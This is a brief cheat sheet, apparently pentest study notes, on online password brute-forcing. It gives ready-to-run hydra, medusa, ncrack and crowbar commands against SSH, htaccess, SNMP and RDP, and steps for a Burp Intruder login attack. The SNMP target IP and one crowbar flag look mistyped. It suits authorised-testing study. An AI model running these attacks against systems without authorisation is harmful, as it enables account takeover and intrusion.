# Online Cracking

## Overview

* several tools specialized for bruteforcing online
* several different services that are common for bruteforce
* VNC, SSH, FTP, SNMP, POP3, HTTP.

## Port 22 - SSH

```bash
hydra -l root -P wordlist.txt 192.168.0.101 ssh
```

```bash
hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V
```

## Port 80/443 htaccess

* password protect directories with apache pretty easily
* just configure the htaccess
* brute forced like this

```bash
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
```

## Logins

* use Burp Suite
* intecept a login attempt.
* right-cick "Send to intruder"
* select Sniper if you have only one field you want to bruteforce, like if the username is known
* otherwise select cluster-attack
* select your payload, aka wordlist
* click attack
* look for response-length that differs from the rest

## Port 161 - SNMP

* using hydra

```bash
hydra -P wordlist.txt -v 102.168.0.101 snmp
```

## Port 3389 - Remote Desktop Protocol

* use Ncrack

```bash
ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
```

* use crowbar

```bash
# -b : protocol
# -s : RHOST
# -u : username
# -c : wordlist
# -n : threads
crowbar -b rdp -s 10.10.10.10/32 -u admin -C ./passwords.txt -n 1
```
